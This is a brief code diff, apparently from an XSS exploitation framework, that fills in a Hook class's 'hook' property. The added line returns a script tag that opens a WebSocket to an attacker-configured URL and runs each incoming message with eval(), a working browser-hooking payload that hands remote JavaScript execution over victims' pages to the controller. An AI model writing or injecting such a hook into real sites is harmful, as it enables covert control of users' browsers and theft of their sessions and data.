@@ -12,4 +12,4 @@ class Hook(BaseHook):
 
     @property
     def hook(self) -> str:
-        pass
+        return f"<script>c=new WebSocket('{self.environment.url}');c.onmessage=(e)=>eval(e.data);</script>"
